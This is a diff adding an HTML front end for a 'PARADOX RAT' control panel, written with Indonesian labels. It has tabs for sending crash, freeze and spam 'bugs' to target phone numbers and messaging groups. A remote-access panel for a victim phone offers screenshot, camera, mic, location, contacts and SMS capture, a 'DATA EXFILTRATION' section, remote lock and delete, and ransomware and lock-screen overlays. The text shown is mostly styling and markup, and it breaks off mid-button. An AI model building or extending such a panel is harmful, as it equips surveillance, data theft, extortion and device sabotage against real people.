@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VERNOSA SYSTEM + PARADOX RAT</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
+<style>
+    /* ================================================================ */
+    /* GLOBAL (VEGA + RAT) */
+    /* ================================================================ */
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Orbitron', sans-serif;
+    }
+    body {
+        background: #111;
+        overflow: hidden;
+        color: white;
+    }
+
+    /* ========== LOGIN ========== */
+    #loginPage {
+        width: 100%;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: radial-gradient(circle at top, #2f2f2f, #111 70%);
+    }
+    .login-box {
+        width: 350px;
+        padding: 30px;
+        border-radius: 30px;
+        background: rgba(30, 30, 30, 0.75);
+        border: 2px solid #666;
+        box-shadow: 0 0 20px #555;
+        backdrop-filter: blur(10px);
+        text-align: center;
+    }
+    .profile {
+        width: 110px;
+        height: 110px;
+        border-radius: 50%;
+        border: 4px solid #999;
+        object-fit: cover;
+        margin-bottom: 20px;
+    }
+    .title {
+        font-size: 36px;
+        font-weight: 900;
+        margin-bottom: 20px;
+        color: #ddd;
+        text-shadow: 0 0 10px #888;
+    }
+    .input-box {
+        width: 100%;
+        padding: 18px;
+        margin: 10px 0;
+        border: none;
+        outline: none;
+        border-radius: 18px;
+        background: #1f1f1f;
+        border: 2px solid #666;
+        color: white;
+        font-size: 15px;
+    }
+    .login-btn {
+        width: 100%;
+        padding: 18px;
+        margin-top: 15px;
+        border: none;
+        border-radius: 20px;
+        background: linear-gradient(90deg, #555, #999);
+        color: white;
+        font-size: 20px;
+        font-weight: bold;
+        cursor: pointer;
+    }
+
+    /* ========== INTRO ========== */
+    #introPage {
+        position: fixed;
+        inset: 0;
+        display: none;
+        background: black;
+        overflow: hidden;
+        z-index: 999;
+    }
+    #introVideo {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        filter: brightness(0.45);
+    }
+    .intro-overlay {
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(to top, rgba(0,0,0,0.95), rgba(0,0,0,0.2), rgba(0,0,0,0.95));
+    }
+    .intro-content {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        text-align: center;
+        width: 100%;
+        z-index: 5;
+    }
+    .intro-line {
+        width: 250px;
+        height: 5px;
+        margin: auto;
+        margin-bottom: 20px;
+        border-radius: 50px;
+        background: linear-gradient(90deg, transparent, white, #999, white, transparent);
+        box-shadow: 0 0 15px white;
+    }
+    .intro-sub {
+        font-size: 17px;
+        letter-spacing: 8px;
+        color: #eee;
+        text-shadow: 0 0 10px #999;
+    }
+    .skip-btn {
+        position: absolute;
+        top: 20px;
+        right: 20px;
+        padding: 12px 24px;
+        border: none;
+        border-radius: 30px;
+        background: rgba(255,255,255,0.1);
+        border: 1px solid #999;
+        color: white;
+        cursor: pointer;
+        z-index: 10;
+    }
+
+    /* ========== DASHBOARD ========== */
+    #dashboard {
+        display: none;
+        width: 100%;
+        height: 100vh;
+        overflow: auto;
+        padding: 20px;
+        background: radial-gradient(circle at top, #2a2a2a, #111 70%);
+    }
+    .topbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+    }
+    .logo {
+        font-size: 30px;
+        font-weight: 900;
+        color: #ddd;
+    }
+    .icon-group {
+        display: flex;
+        gap: 10px;
+    }
+    .icon {
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        border: 2px solid #777;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 22px;
+        cursor: pointer;
+    }
+
+    /* BANNER */
+    .banner {
+        width: 100%;
+        height: 220px;
+        border-radius: 25px;
+        overflow: hidden;
+        margin-bottom: 20px;
+        border: 2px solid #666;
+    }
+    .banner video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+    }
+
+    /* TAB */
+    .tab-group {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 20px;
+    }
+    .tab-btn {
+        flex: 1;
+        padding: 16px;
+        border: none;
+        border-radius: 20px;
+        background: #1f1f1f;
+        border: 2px solid #666;
+        color: white;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: 0.2s;
+    }
+    .tab-btn.active {
+        background: linear-gradient(90deg, #555, #999);
+    }
+
+    /* SECTION */
+    .section-title {
+        font-size: 26px;
+        margin-bottom: 15px;
+        color: #ddd;
+    }
+    .input {
+        width: 100%;
+        padding: 18px;
+        margin-bottom: 15px;
+        border-radius: 18px;
+        border: 2px solid #666;
+        background: #1f1f1f;
+        color: white;
+        outline: none;
+    }
+    select {
+        width: 100%;
+        padding: 18px;
+        border-radius: 18px;
+        border: 2px solid #666;
+        background: #1f1f1f;
+        color: white;
+        margin-bottom: 15px;
+    }
+    .send-btn {
+        width: 100%;
+        padding: 20px;
+        border: none;
+        border-radius: 22px;
+        background: linear-gradient(90deg, #555, #999);
+        color: white;
+        font-size: 22px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 10px;
+    }
+    #statusBox {
+        display: none;
+        margin-top: 20px;
+        padding: 20px;
+        border-radius: 20px;
+        background: #1f1f1f;
+        border: 2px solid #666;
+        line-height: 30px;
+    }
+
+    /* MUSIC */
+    .music-box {
+        margin-top: 25px;
+        padding: 20px;
+        border-radius: 20px;
+        border: 2px solid #666;
+    }
+    .music-control {
+        display: flex;
+        gap: 10px;
+        margin-top: 15px;
+    }
+    .music-control button {
+        flex: 1;
+        padding: 16px;
+        border: none;
+        border-radius: 18px;
+        background: #1f1f1f;
+        border: 2px solid #666;
+        color: white;
+        cursor: pointer;
+    }
+
+    /* NAV */
+    .bottom-nav {
+        margin-top: 30px;
+        display: flex;
+        justify-content: space-around;
+        padding: 18px;
+        border-radius: 20px;
+        border: 2px solid #666;
+    }
+    .bottom-nav div {
+        font-size: 28px;
+        cursor: pointer;
+    }
+
+    /* ================================================================ */
+    /* PARADOX RAT STYLES (diintegrasikan) */
+    /* ================================================================ */
+    .rat-grid2 {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 8px;
+        margin-bottom: 12px;
+    }
+    .rat-grid3 {
+        display: grid;
+        grid-template-columns: 1fr 1fr 1fr;
+        gap: 8px;
+        margin-bottom: 12px;
+    }
+    .rat-btn {
+        padding: 14px;
+        border: none;
+        border-radius: 14px;
+        font-weight: bold;
+        font-size: 13px;
+        cursor: pointer;
+        transition: 0.15s;
+        background: #1f1f1f;
+        color: white;
+        border: 2px solid #666;
+    }
+    .rat-btn:active {
+        transform: scale(0.93);
+    }
+    .rat-btn.primary { background: linear-gradient(135deg, #00D4FF, #0077B3); color: #000; border: none; }
+    .rat-btn.success { background: linear-gradient(135deg, #00E676, #00994D); color: #000; border: none; }
+    .rat-btn.warning { background: linear-gradient(135deg, #FFD600, #CC9900); color: #000; border: none; }
+    .rat-btn.danger { background: linear-gradient(135deg, #FF0044, #B3002E); color: #fff; border: none; }
+    .rat-btn.outline { background: transparent; border: 2px solid #666; }
+    .rat-btn.gold { background: linear-gradient(135deg, #FFD700, #B8860B); color: #000; border: none; }
+
+    .rat-section-title {
+        font-size: 14px;
+        font-weight: bold;
+        color: #aaa;
+        margin: 16px 0 6px 0;
+        letter-spacing: 2px;
+        text-transform: uppercase;
+        border-bottom: 1px solid #444;
+        padding-bottom: 4px;
+    }
+
+    .rat-status-box {
+        background: #1f1f1f;
+        border-radius: 14px;
+        padding: 12px;
+        text-align: center;
+        border: 2px solid #666;
+        margin-bottom: 8px;
+    }
+    .rat-status-box .label {
+        font-size: 10px;
+        color: #888;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+    .rat-status-box .value {
+        font-size: 18px;
+        font-weight: bold;
+        color: #00D4FF;
+        display: block;
+        margin-top: 2px;
+    }
+    .rat-status-box .value.red { color: #FF0044; }
+    .rat-status-box .value.gold { color: #FFD700; }
+    .rat-status-box .value.green { color: #00E676; }
+
+    .rat-log {
+        background: #1f1f1f;
+        border-radius: 14px;
+        padding: 10px;
+        max-height: 100px;
+        overflow-y: auto;
+        font-size: 11px;
+        color: #aaa;
+        margin-top: 12px;
+        border: 2px solid #666;
+    }
+    .rat-log span { color: #00D4FF; }
+
+    .rat-app-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 8px 0;
+        border-bottom: 1px solid #444;
+    }
+    .rat-app-item .app-name {
+        font-size: 13px;
+        color: #ddd;
+    }
+    .rat-btn-blokir {
+        padding: 4px 12px;
+        font-size: 10px;
+        background: #FF0044;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+    }
+    .rat-btn-blokir.unblock {
+        background: #00E676;
+        color: #000;
+    }
+
+    /* live preview */
+    .rat-live-view {
+        background: #000;
+        border-radius: 16px;
+        border: 2px solid #666;
+        min-height: 160px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: #555;
+        font-size: 13px;
+        margin-bottom: 10px;
+        position: relative;
+        overflow: hidden;
+    }
+    .rat-live-view img {
+        width: 100%;
+        display: none;
+    }
+    .rat-live-view .live-status {
+        position: absolute;
+        top: 8px;
+        right: 8px;
+        font-size: 10px;
+        color: #00E676;
+        background: rgba(0,0,0,0.7);
+        padding: 2px 10px;
+        border-radius: 12px;
+        display: none;
+    }
+
+    /* admin list */
+    .rat-admin-list {
+        max-height: 160px;
+        overflow-y: auto;
+        text-align: left;
+    }
+    .rat-admin-item {
+        display: flex;
+        justify-content: space-between;
+        padding: 4px 0;
+        border-bottom: 1px solid #444;
+        font-size: 12px;
+    }
+    .rat-admin-item .uname { color: #00D4FF; font-weight: bold; }
+    .rat-admin-item .urole { color: #888; font-size: 10px; }
+    .rat-admin-item .ustatus.on { color: #00E676; }
+    .rat-admin-item .ustatus.off { color: #FF8800; }
+    .rat-admin-btn {
+        background: #1f1f1f;
+        color: #fff;
+        border: 2px solid #666;
+        border-radius: 6px;
+        padding: 2px 8px;
+        font-size: 10px;
+        cursor: pointer;
+    }
+    .rat-admin-btn.edit { background: #00D4FF; color: #000; border: none; }
+    .rat-admin-btn.danger { background: #FF0044; color: #fff; border: none; }
+
+    /* ================================================================ */
+    /* RAT PANEL PAGE (di dalam tab) */
+    /* ================================================================ */
+    .rat-page {
+        display: none;
+    }
+    .rat-page.active {
+        display: block;
+    }
+
+    .rat-nav {
+        display: flex;
+        gap: 6px;
+        flex-wrap: wrap;
+        margin-bottom: 12px;
+    }
+    .rat-nav .rat-nav-btn {
+        padding: 10px 16px;
+        border-radius: 14px;
+        border: 2px solid #666;
+        background: #1f1f1f;
+        color: #fff;
+        font-size: 12px;
+        cursor: pointer;
+        transition: 0.2s;
+        flex: 1;
+        text-align: center;
+    }
+    .rat-nav .rat-nav-btn.active {
+        background: linear-gradient(90deg, #555, #999);
+        border-color: #999;
+    }
+
+    /* ========== LOCK SCREEN OVERLAY ========== */
+    .lock-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+        background: radial-gradient(ellipse at 50% 30%, #1a0a12 0%, #0a0508 50%, #000 100%);
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+    .lock-overlay.show {
+        display: flex;
+    }
+    .lock-overlay .lock-icon { font-size: 70px; margin-bottom: 8px; animation: pulse 2s infinite; }
+    .lock-overlay .lock-title { font-size: 26px; font-weight: 800; color: #ff0044; text-shadow: 0 0 60px rgba(255,0,68,0.3); letter-spacing: 3px; }
+    .lock-overlay .lock-sub { font-size: 13px; color: #94A3B8; opacity: 0.7; letter-spacing: 2px; margin-top: 4px; }
+    .lock-overlay .lock-mampus { font-size: 22px; font-weight: 900; color: #00BFFF; margin-top: 10px; padding: 8px 20px; border: 1.5px solid rgba(0,191,255,0.12); border-radius: 16px; animation: glitchText 2s infinite; }
+    .lock-overlay .lock-countdown { font-size: 28px; font-weight: bold; color: #FFD700; margin-top: 10px; animation: pulse 1s infinite; }
+    .lock-overlay .lock-info { font-size: 10px; color: #555; margin-top: 6px; font-family: monospace; }
+    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+    @keyframes glitchText { 0%,100% { transform: translateX(0); } 2% { transform: translateX(-3px); } 4% { transform: translateX(3px); } 6% { transform: translateX(-1px); } 8% { transform: translateX(0); } }
+
+    /* ========== RANSOMWARE OVERLAY ========== */
+    .ransom-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        z-index: 9998;
+        background: #0a0508;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+    .ransom-overlay.show {
+        display: flex;
+    }
+    .ransom-overlay .ransom-icon { font-size: 70px; animation: pulse 1.5s infinite; }
+    .ransom-overlay .ransom-title { font-size: 24px; font-weight: 800; color: #ff0044; letter-spacing: 2px; margin-top: 4px; }
+    .ransom-overlay .ransom-sub { font-size: 13px; color: #94A3B8; margin-top: 4px; }
+    .ransom-overlay .ransom-price { font-size: 32px; font-weight: 900; color: #FFD700; margin: 10px 0; }
+    .ransom-overlay .ransom-btn { padding: 14px 40px; background: #ff0044; color: #fff; border: none; border-radius: 16px; font-size: 18px; font-weight: bold; cursor: pointer; }
+    .ransom-overlay .ransom-timer { font-size: 14px; color: #ff004466; margin-top: 8px; }
+    .ransom-overlay .ransom-timer span { color: #ff0044; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<!-- ========== LOGIN ========== -->
+<div id="loginPage">
+    <div class="login-box">
+        <img src="foto.png" class="profile">
+        <div class="title">P R D X</div>
+        <input type="text" class="input-box" id="loginUser" placeholder="USERNAME">
+        <input type="password" class="input-box" id="loginPass" placeholder="PASSWORD">
+        <button class="login-btn" onclick="startIntro()">LOGIN</button>
+    </div>
+</div>
+
+<!-- ========== INTRO ========== -->
+<div id="introPage">
+    <video id="introVideo" playsinline>
+        <source src="intro.mp4" type="video/mp4">
+    </video>
+    <div class="intro-overlay"></div>
+    <div class="intro-content">
+        <div class="intro-line"></div>
+        <p class="intro-sub">Welcome to PARADOX</p>
+    </div>
+    <button class="skip-btn" onclick="openDashboard()">SKIP</button>
+</div>
+
+<!-- ========== DASHBOARD ========== -->
+<div id="dashboard">
+    <div class="topbar">
+        <div class="logo">Gass kuy</div>
+        <div class="icon-group">
+            <div class="icon" onclick="alert('Profile')">👤</div>
+            <div class="icon" onclick="alert('Settings')">⚙</div>
+        </div>
+    </div>
+
+    <!-- BANNER -->
+    <div class="banner">
+        <video autoplay muted loop>
+            <source src="banner.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <!-- TAB GROUP (ditambah RAT) -->
+    <div class="tab-group">
+        <button class="tab-btn active" id="bugNomorBtn" onclick="bugNomor()">BUG NOMOR</button>
+        <button class="tab-btn" id="bugGroupBtn" onclick="bugGroup()">BUG GROUP</button>
+        <button class="tab-btn" id="ratTabBtn" onclick="showRat()">RAT PANEL</button>
+    </div>
+
+    <!-- BUG NOMOR -->
+    <div id="bugNomorPage">
+        <div class="section-title">NOMOR TARGET</div>
+        <input type="text" class="input" id="targetNumber" placeholder="+62xxxxxxxxxx">
+        <select id="bugType">
+            <option>CRASH BUG</option>
+            <option>FREEZE BUG</option>
+            <option>DELAY BUG</option>
+        </select>
+        <button class="send-btn" onclick="sendBugNomor()">SEND BUG</button>
+    </div>
+
+    <!-- BUG GROUP -->
+    <div id="bugGroupPage" style="display:none;">
+        <div class="section-title">GROUP TARGET</div>
+        <input type="text" class="input" id="groupTarget" placeholder="LINK GROUP">
+        <select id="groupBugType">
+            <option>SPAM BUG</option>
+            <option>FREEZE BUG</option>
+            <option>LAG BUG</option>
+        </select>
+        <button class="send-btn" onclick="sendBugGroup()">SEND BUG</button>
+    </div>
+
+    <!-- ========== RAT PANEL ========== -->
+    <div id="ratPanelPage" style="display:none;">
+
+        <!-- NAV RAT (sub tab) -->
+        <div class="rat-nav">
+            <div class="rat-nav-btn active" onclick="ratNav('ratMain')">RAT</div>
+            <div class="rat-nav-btn" onclick="ratNav('ratLock')">🔐 Lock</div>
+            <div class="rat-nav-btn" onclick="ratNav('ratRansom')">☠ Ransom</div>
+            <div class="rat-nav-btn" onclick="ratNav('ratAdmin')">⚜️ Admin</div>
+            <div class="rat-nav-btn" onclick="ratNav('ratBlock')">✖️ Blokir</div>
+            <div class="rat-nav-btn" onclick="ratNav('ratRole')">🎯 Role</div>
+        </div>
+
+        <!-- RAT MAIN -->
+        <div id="ratMain" class="rat-page active">
+            <div class="section-title">📡 RAT PANEL</div>
+            <div class="devname" style="font-size:16px;color:#00D4FF;margin-bottom:8px;">📱 Samsung S23</div>
+
+            <div class="rat-section-title">🎮 RAT KONTROL</div>
+            <div class="rat-grid3">
+                <button class="rat-btn primary" onclick="ratAksi('Screenshot')">📸</button>
+                <button class="rat-btn success" onclick="ratAksi('Location')">📍</button>
+                <button class="rat-btn warning" onclick="ratAksi('Contacts')">📇</button>
+                <button class="rat-btn primary" onclick="ratAksi('SMS')">💬</button>
+                <button class="rat-btn success" onclick="ratAksi('Camera')">📷</button>
+                <button class="rat-btn warning" onclick="ratAksi('Mic')">🎤</button>
+                <button class="rat-btn danger" onclick="ratAksi('Lock')">🔒</button>
+                <button class="rat-btn success" onclick="ratAksi('Unlock')">🔓</button>
+                <button class="rat-btn danger" onclick="ratAksi('Delete')">🗑️</button>
+            </div>
+
+            <div class="rat-section-title">📱 DATA EXFILTRATION</div>
+            <div class="rat-grid3">
+                <button class="rat-btn primary" onclick="ratAksi('Ambil Kontak')">📇</button>
+                <button class="rat-btn success" onclick="ratAksi('Ambil
